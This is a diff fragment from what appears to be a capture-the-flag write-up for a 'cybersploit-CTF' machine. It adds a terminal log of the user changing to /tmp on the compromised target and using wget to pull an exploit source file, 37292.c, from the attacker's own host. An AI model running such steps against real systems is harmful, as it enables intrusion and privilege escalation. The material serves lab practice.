@@ -179,6 +179,23 @@ Shellcodes: No Results
 3. find the ip address of your machine by command: ifconfig
 4. Now we download that file to our target machine by moving to /tmp directory, by the following command.(wget http://192.168.49.114/37292.c
 )
+```
+```python
+itsskv@cybersploit-CTF:~$ cd /tmp
+itsskv@cybersploit-CTF:/tmp$ wget http://192.168.49.114/37292.c
+--2022-09-01 10:45:09--  http://192.168.49.114/37292.c
+Connecting to 192.168.49.114:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/x-csrc]
+Saving to: `37292.c'
+
+100%[=======================================================================================================>] 5,119       --.-K/s   in 0.01s   
+
+2022-09-01 10:45:09 (349 KB/s) - `37292.c' saved [5119/5119]
+
+itsskv@cybersploit-CTF:/tmp$ ls
+37292.c  at-spi2  pulse-Pa7SbdbpeExT  unity_support_test.1  vmware-root
+itsskv@cybersploit-CTF:/tmp$ 
 
 ```
 
